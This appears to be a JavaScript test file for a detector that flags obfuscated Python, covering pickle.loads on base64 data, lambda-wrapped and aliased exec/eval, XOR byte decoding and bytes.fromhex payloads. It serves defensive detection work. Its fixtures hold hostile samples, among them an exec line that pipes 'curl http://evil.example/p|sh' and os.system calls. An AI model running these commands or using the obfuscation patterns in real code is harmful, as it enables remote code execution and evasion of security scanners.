'use strict';
// python-obfuscation-phase3.test.js — Phase-3 additions under
// src/decoders/python-obfuscation.js. Covers four new branches added
// in the "script deobfuscator deep-fill" pass:
//
//   P7.  pickle.loads(base64.b64decode('…'))   — RCE primitive,
//        distinct from P2 (marshal) because pickle's __reduce__ hook
//        executes arbitrary code at unpickling time (CWE-502,
//        T1059.006).
//   P8a. (lambda s: exec(s))(payload) / (lambda: exec(payload))() —
//        IIFE-wrapped exec/eval/compile.
//   P8b. alias = exec; alias(payload) — named-alias obfuscation.
//   P9.  bytes([b ^ KEY for b in b'…']) / bytearray(...) — single-byte
//        XOR list-comp decode against literal int + literal bytestring.
//   P10. exec(bytes.fromhex('…').decode()) — hex-alphabet alternative
//        to P1/P2.
//
// Each test asserts BOTH that a candidate of the expected technique is
// emitted AND that the deobfuscated string contains the planted sentinel
// token.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/python-obfuscation.js',
]);
const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

function pick(cands, pred) { return host(cands.filter(pred)); }
function b64(s) { return Buffer.from(s, 'utf8').toString('base64'); }

// ───── P7: pickle.loads(b64) ────────────────────────────────────
test('python pickle.loads: decodes PROTO-4 pickle stream', () => {
  // Minimal pickle: PROTO(4) + NONE + STOP = 0x80 0x04 0x4e 0x2e
  const pickleBytes = Buffer.from([0x80, 0x04, 0x4e, 0x2e]).toString('base64');
  const text = `import pickle,base64\nexec(pickle.loads(base64.b64decode('${pickleBytes}')))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /pickle\.loads/.test(c.technique));
  assert.ok(hits.length >= 1, `expected pickle candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true);
  // Verifies _patternIocs carries the CWE-502 RCE marker.
  assert.ok(Array.isArray(hits[0]._patternIocs) && hits[0]._patternIocs.length >= 1);
  assert.equal(hits[0]._patternIocs[0].severity, 'high');
});

test('python pickle.loads: accepts cPickle Python-2 legacy alias', () => {
  const pickleBytes = Buffer.from([0x80, 0x02, 0x4e, 0x2e]).toString('base64');
  const text = `import cPickle,base64\ncPickle.loads(base64.b64decode(b'${pickleBytes}'))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /pickle\.loads/.test(c.technique));
  assert.ok(hits.length >= 1, `expected cPickle candidate; got: ${JSON.stringify(host(cands))}`);
});

test('python pickle.loads: rejects non-pickle header bytes', () => {
  // Bytes that start with 0xFF — not a pickle opcode. Default gate
  // must suppress (not bruteforce mode).
  const junk = Buffer.from([0xff, 0xff, 0xff, 0xff, 0x00]).toString('base64');
  const text = `pickle.loads(base64.b64decode('${junk}'))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /pickle\.loads/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected pickle candidate: ${JSON.stringify(hits)}`);
});

// ───── P8a: lambda-wrapped exec/eval/compile ────────────────────
test('python lambda-wrapped exec: IIFE with exec sink', () => {
  const payload = b64("import os; os.system('whoami')");
  const text = `(lambda s: exec(s))(__import__('base64').b64decode('${payload}').decode())`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /lambda-wrapped exec/.test(c.technique));
  assert.ok(hits.length >= 1, `expected lambda-exec candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true);
});

test('python lambda-wrapped eval: zero-arg lambda IIFE', () => {
  const text = `(lambda: eval("__import__('os').system('id')"))()`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /lambda-wrapped eval/.test(c.technique));
  assert.ok(hits.length >= 1, `expected lambda-eval candidate; got: ${JSON.stringify(host(cands))}`);
});

test('python lambda-wrapped compile: IIFE with compile sink', () => {
  const text = `(lambda _c: _c("x=1","<s>","exec"))(compile)`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /lambda-wrapped compile/.test(c.technique));
  assert.ok(hits.length >= 1, `expected lambda-compile candidate; got: ${JSON.stringify(host(cands))}`);
});

// ───── P8b: aliased exec/eval ───────────────────────────────────
test('python aliased exec: alias + call', () => {
  const text = `_x = exec\n_x("import os; os.system('curl http://evil.example/p|sh')")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Aliased exec/.test(c.technique));
  assert.ok(hits.length >= 1, `expected aliased-exec candidate; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true);
});

test('python aliased eval: semicolon-separated form', () => {
  const text = `e_ = eval; e_("__import__('os').system('id')")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Aliased eval/.test(c.technique));
  assert.ok(hits.length >= 1, `expected aliased-eval candidate; got: ${JSON.stringify(host(cands))}`);
});

test('python aliased: rejects alias that shadows dangerous builtin', () => {
  // `getattr = exec` is not obfuscation — it would shadow the real
  // getattr. Decoder must suppress.
  const text = `getattr = exec\nfoo = 1\ngetattr("x")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /Aliased exec/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected aliased candidate for shadowed builtin: ${JSON.stringify(hits)}`);
});

// ───── P9: bytes XOR list-comp ──────────────────────────────────
test('python bytes XOR: decodes \\xNN bytestring with hex key', () => {
  // XOR 'os.system("id")' with 0x42 → bytestring. Must decode to a
  // payload that hits SENSITIVE_PY_KEYWORDS (curl/wget aren't in
  // that gate — they're bash/cmd vocabulary).
  const plain = 'os.system("id")';
  let hex = '';
  for (let i = 0; i < plain.length; i++) {
    hex += '\\x' + (plain.charCodeAt(i) ^ 0x42).toString(16).padStart(2, '0');
  }
  const text = `bytes([b ^ 0x42 for b in b'${hex}'])`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /XOR List-Comp/.test(c.technique));
  assert.ok(hits.length >= 1, `expected XOR candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /os\.system/);
});

test('python bytes XOR: accepts decimal key + bytearray generator form', () => {
  const plain = 'os.system';
  let hex = '';
  for (let i = 0; i < plain.length; i++) {
    hex += '\\x' + (plain.charCodeAt(i) ^ 66).toString(16).padStart(2, '0');
  }
  const text = `bytearray(c ^ 66 for c in b'${hex}')`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /XOR List-Comp/.test(c.technique));
  assert.ok(hits.length >= 1, `expected bytearray XOR candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /os\.system/);
});

test('python bytes XOR: suppresses benign bit-twiddle (decode is garbage)', () => {
  // Random bytes XOR'd with 0x42 that produces no SENSITIVE_PY hit.
  const text = `bytes([b ^ 0x42 for b in b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07'])`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /XOR List-Comp/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected XOR candidate on benign twiddle: ${JSON.stringify(hits)}`);
});

// ───── P10: bytes.fromhex().decode() ────────────────────────────
test('python bytes.fromhex: decodes hex to os.system payload', () => {
  const payload = "import os; os.system('whoami')";
  const hex = Buffer.from(payload, 'utf8').toString('hex');
  const text = `exec(bytes.fromhex('${hex}').decode())`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /fromhex/.test(c.technique));
  assert.ok(hits.length >= 1, `expected fromhex candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /os\.system/);
  assert.equal(hits[0]._executeOutput, true);
});

test('python bytes.fromhex: bytearray.fromhex + explicit codec arg', () => {
  const payload = "subprocess.call(['curl','http://x'])";
  const hex = Buffer.from(payload, 'utf8').toString('hex');
  const text = `eval(bytearray.fromhex('${hex}').decode('utf-8'))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /fromhex/.test(c.technique));
  assert.ok(hits.length >= 1, `expected bytearray.fromhex candidate; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /subprocess/);
});

test('python bytes.fromhex: rejects too-short hex runs', () => {
  // 14 hex chars = 7 bytes — below the 16-char minimum.
  const text = `exec(bytes.fromhex('41424344454647').decode())`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = host(cands).filter(c => /fromhex/.test(c.technique));
  assert.equal(hits.length, 0,
    `unexpected fromhex candidate on short run: ${JSON.stringify(hits)}`);
});

// ───── Amp-budget invariant: every Phase-3 candidate within cap ──
test('phase-3 branches: every candidate honours the 32× raw amp cap', () => {
  const pickleBytes = Buffer.from([0x80, 0x04, 0x4e, 0x2e]).toString('base64');
  const xorPlain = 'os.system("id")';
  let xorHex = '';
  for (let i = 0; i < xorPlain.length; i++) {
    xorHex += '\\x' + (xorPlain.charCodeAt(i) ^ 0x42).toString(16).padStart(2, '0');
  }
  const fromhex = Buffer.from("import os; os.system('whoami')", 'utf8').toString('hex');
  const seeds = [
    `exec(pickle.loads(base64.b64decode('${pickleBytes}')))`,
    `(lambda s: exec(s))(__import__('base64').b64decode('${b64("os.system('x')")}').decode())`,
    `_x = exec\n_x("os.system('x')")`,
    `bytes([b ^ 0x42 for b in b'${xorHex}'])`,
    `exec(bytes.fromhex('${fromhex}').decode())`,
  ];
  for (const text of seeds) {
    const cands = host(d._findPythonObfuscationCandidates(text, {}));
    for (const c of cands) {
      const rawLen = (c.raw || '').length;
      const deobfLen = (c.deobfuscated || '').length;
      assert.ok(deobfLen <= 32 * Math.max(1, rawLen),
        `amp cap exceeded: technique=${c.technique} raw=${rawLen} deobf=${deobfLen}`);
    }
  }
});
